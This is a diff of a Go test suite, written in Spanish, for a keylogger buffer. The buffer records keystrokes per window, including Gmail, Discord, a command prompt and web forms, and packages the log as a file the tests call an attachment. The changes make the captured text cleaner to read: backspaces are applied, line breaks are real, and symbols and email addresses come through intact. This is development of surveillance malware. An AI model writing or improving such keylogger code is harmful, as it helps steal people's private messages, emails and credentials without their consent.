@@ -19,96 +19,142 @@ func stampAt(text string) time.Time {
 	return parsed.UTC()
 }
 
-func specialAt(at time.Time, label string) win32.KeyEvent {
-	return win32.KeyEvent{Timestamp: at, IsSpecial: true, Label: label}
+func typed(text string) []win32.KeyEvent {
+	events := make([]win32.KeyEvent, 0, len(text))
+	for _, r := range text {
+		events = append(events, win32.KeyEvent{Rune: r})
+	}
+	return events
 }
 
-func TestAutoRepeatSeFunde(t *testing.T) {
-	buffer := &KeylogBuffer{}
-	base := stampAt("2026-11-23 14:32:01")
-	buffer.StartSession("chrome.exe", "Gmail - Inbox", base)
-
-	for _, r := range "hola" {
-		buffer.Append(win32.KeyEvent{Timestamp: base, Rune: r})
-	}
-	for i := 0; i < 16; i++ {
-		buffer.Append(specialAt(base.Add(time.Duration(i)*33*time.Millisecond), "[RIGHT]"))
-	}
-
-	dump := buffer.FormatDump()
-	if strings.Contains(dump, "[VK:0x27]") {
-		t.Fatalf("el VK crudo sigue saliendo en el dump:\n%s", dump)
-	}
-	if !strings.Contains(dump, "[RIGHT]x16") {
-		t.Fatalf("el auto-repeat no se fundió:\n%s", dump)
-	}
-	if got := strings.Count(dump, "[RIGHT]"); got != 1 {
-		t.Fatalf("esperado un solo bloque [RIGHT], hay %d:\n%s", got, dump)
-	}
-	t.Logf("dump:\n%s", dump)
+func backspace() win32.KeyEvent {
+	return win32.KeyEvent{Vk: keyBackspace, IsSpecial: true}
 }
 
-func TestPulsacionesSeparadasNoSeFunden(t *testing.T) {
+func TestDumpEsTextoPlano(t *testing.T) {
 	buffer := &KeylogBuffer{}
-	base := stampAt("2026-11-23 14:32:01")
-	buffer.StartSession("chrome.exe", "Gmail - Inbox", base)
+	at := stampAt("2026-11-24 15:32:01")
+	buffer.StartSession("notepad.exe", "Sin título: Bloc de notas", at)
 
-	buffer.Append(specialAt(base, "[RIGHT]"))
-	buffer.Append(specialAt(base.Add(600*time.Millisecond), "[RIGHT]"))
-
-	dump := buffer.FormatDump()
-	if strings.Contains(dump, "x2") {
-		t.Fatalf("se fundieron dos pulsaciones distintas:\n%s", dump)
+	for _, event := range typed("hola mundo") {
+		buffer.Append(event)
 	}
-	if got := strings.Count(dump, "[RIGHT]"); got != 2 {
-		t.Fatalf("esperadas dos marcas, hay %d:\n%s", got, dump)
+
+	want := "[notepad.exe | Sin título: Bloc de notas | 2026-11-24 15:32:01 UTC]\n" +
+		"hola mundo\n"
+	if got := buffer.FormatDump(); got != want {
+		t.Fatalf("dump distinto.\nesperado:\n%q\nobtenido:\n%q", want, got)
 	}
 }
 
-func TestFormatoDumpExacto(t *testing.T) {
+func TestBackspaceBorraUltimoCaracter(t *testing.T) {
 	buffer := &KeylogBuffer{}
-	first := stampAt("2026-11-23 14:32:01")
+	at := stampAt("2026-11-24 15:32:01")
+	buffer.StartSession("chrome.exe", "Gmail - Inbox", at)
+
+	for _, event := range typed("hola mundo") {
+		buffer.Append(event)
+	}
+	for i := 0; i < 3; i++ {
+		buffer.Append(backspace())
+	}
+
+	if got := buffer.FormatDump(); !strings.Contains(got, "\nhola mu\n") {
+		t.Fatalf("backspace no borró:\n%s", got)
+	}
+	if strings.Contains(buffer.FormatDump(), "[BKSP]") {
+		t.Fatal("quedó el marcador [BKSP] en el dump")
+	}
+}
+
+func TestBackspaceHastaVacioOmiteBloque(t *testing.T) {
+	buffer := &KeylogBuffer{}
+	at := stampAt("2026-11-24 15:32:01")
+	buffer.StartSession("cmd.exe", "Símbolo del sistema", at)
+
+	buffer.Append(win32.KeyEvent{Rune: 'a'})
+	buffer.Append(win32.KeyEvent{Rune: 'b'})
+	buffer.Append(backspace())
+	buffer.Append(backspace())
+	buffer.Append(backspace())
+
+	if got := buffer.FormatDump(); got != "" {
+		t.Fatalf("un bloque vacío no debe salir: %q", got)
+	}
+}
+
+func TestEnterEscribeSaltoReal(t *testing.T) {
+	buffer := &KeylogBuffer{}
+	at := stampAt("2026-11-24 15:32:01")
+	buffer.StartSession("notepad.exe", "notas.txt", at)
+
+	for _, event := range typed("linea uno") {
+		buffer.Append(event)
+	}
+	buffer.Append(win32.KeyEvent{Vk: 0x0D, Rune: '\n'})
+	for _, event := range typed("linea dos") {
+		buffer.Append(event)
+	}
+
+	want := "[notepad.exe | notas.txt | 2026-11-24 15:32:01 UTC]\nlinea uno\nlinea dos\n"
+	if got := buffer.FormatDump(); got != want {
+		t.Fatalf("esperado:\n%q\nobtenido:\n%q", want, got)
+	}
+	if strings.Contains(buffer.FormatDump(), "[ENTER]") {
+		t.Fatal("quedó el marcador [ENTER]")
+	}
+}
+
+func TestSimbolosConShiftLleganTalCual(t *testing.T) {
+	buffer := &KeylogBuffer{}
+	at := stampAt("2026-11-24 15:32:01")
+	buffer.StartSession("chrome.exe", "Formulario", at)
+
+	for _, event := range typed("Correo: ñandú@example.com!") {
+		buffer.Append(event)
+	}
+
+	if got := buffer.FormatDump(); !strings.Contains(got, "Correo: ñandú@example.com!") {
+		t.Fatalf("se perdió el texto con símbolos:\n%s", got)
+	}
+}
+
+func TestSeccionesPorVentanaYFormato(t *testing.T) {
+	buffer := &KeylogBuffer{}
+	first := stampAt("2026-11-24 15:32:01")
 	buffer.StartSession("chrome.exe", "Gmail - Inbox", first)
-
-	for _, r := range "hola como estas" {
-		buffer.Append(win32.KeyEvent{Timestamp: first, Rune: r})
+	for _, event := range typed("hola mundo") {
+		buffer.Append(event)
 	}
-	buffer.Append(specialAt(first, "[ENTER]"))
-	for _, r := range "esto es un mensaje" {
-		buffer.Append(win32.KeyEvent{Timestamp: first, Rune: r})
-	}
-	buffer.Append(specialAt(first, "[CTRL+C]"))
 
-	buffer.StartSession("explorer.exe", "Escritorio", stampAt("2026-11-23 14:33:00"))
+	buffer.StartSession("explorer.exe", "Escritorio", stampAt("2026-11-24 15:33:00"))
 
-	second := stampAt("2026-11-23 14:33:45")
+	second := stampAt("2026-11-24 15:33:45")
 	buffer.StartSession("Discord.exe", "general", second)
-	for _, r := range "oye te mando el archivo" {
-		buffer.Append(win32.KeyEvent{Timestamp: second, Rune: r})
+	for _, event := range typed("te mando el archivo") {
+		buffer.Append(event)
 	}
-	buffer.Append(specialAt(second, "[ENTER]"))
 
-	want := "[2026-11-23 14:32:01 UTC] chrome.exe — \"Gmail - Inbox\"\n" +
-		"hola como estas[ENTER]\n" +
-		"esto es un mensaje[CTRL+C]\n" +
+	want := "[chrome.exe | Gmail - Inbox | 2026-11-24 15:32:01 UTC]\n" +
+		"hola mundo\n" +
 		"\n" +
-		"[2026-11-23 14:33:45 UTC] Discord.exe — \"general\"\n" +
-		"oye te mando el archivo[ENTER]\n"
+		"[Discord.exe | general | 2026-11-24 15:33:45 UTC]\n" +
+		"te mando el archivo\n"
 
 	if got := buffer.FormatDump(); got != want {
-		t.Fatalf("dump distinto.\nesperado:\n%s\nobtenido:\n%s", want, got)
+		t.Fatalf("esperado:\n%s\nobtenido:\n%s", want, got)
 	}
 	if !utf8.ValidString(buffer.FormatDump()) {
 		t.Fatal("el dump no es UTF-8 válido")
 	}
 }
 
-func TestDumpToFileUTF8(t *testing.T) {
+func TestDumpToFileNombreYMultibyte(t *testing.T) {
 	buffer := &KeylogBuffer{}
-	at := stampAt("2026-11-23 09:05:07")
+	at := stampAt("2026-11-24 09:05:07")
 	buffer.StartSession("notepad.exe", "無題 - メモ帳", at)
-	for _, r := range "ñandú 日本語 ключ" {
-		buffer.Append(win32.KeyEvent{Timestamp: at, Rune: r})
+	for _, event := range typed("ñandú 日本語 ключ") {
+		buffer.Append(event)
 	}
 
 	data, name := buffer.DumpToFile()
@@ -124,22 +170,33 @@ func TestDumpToFileUTF8(t *testing.T) {
 	t.Logf("adjunto: %s (%d bytes)", name, len(data))
 }
 
+func TestTituloConSaltoNoRompeHeader(t *testing.T) {
+	buffer := &KeylogBuffer{}
+	at := stampAt("2026-11-24 15:32:01")
+	buffer.StartSession("chrome.exe", "Gmail\nInbox", at)
+	buffer.Append(win32.KeyEvent{Rune: 'x'})
+
+	lines := strings.Split(buffer.FormatDump(), "\n")
+	if len(lines) < 2 {
+		t.Fatalf("dump raro: %q", buffer.FormatDump())
+	}
+	if lines[0] != "[chrome.exe | Gmail Inbox | 2026-11-24 15:32:01 UTC]" {
+		t.Fatalf("header partido: %q", lines[0])
+	}
+}
+
 func TestClearBufferDejaVacio(t *testing.T) {
 	buffer := &KeylogBuffer{}
-	at := stampAt("2026-11-23 10:00:00")
+	at := stampAt("2026-11-24 10:00:00")
 	buffer.StartSession("cmd.exe", "Símbolo del sistema", at)
-	buffer.Append(win32.KeyEvent{Timestamp: at, Rune: 'a'})
-	buffer.Append(specialAt(at, "[RIGHT]"))
+	buffer.Append(win32.KeyEvent{Rune: 'a'})
 
 	buffer.ClearBuffer()
 
-	if dump := buffer.FormatDump(); dump != "" {
-		t.Fatalf("el dump no quedó vacío: %q", dump)
+	if got := buffer.FormatDump(); got != "" {
+		t.Fatalf("el dump no quedó vacío: %q", got)
 	}
 	if n := buffer.sessionCount(); n != 0 {
 		t.Fatalf("quedaron %d sesiones", n)
-	}
-	if buffer.repeat.index != -1 {
-		t.Fatal("el estado de repetición sobrevivió al clear")
 	}
 }
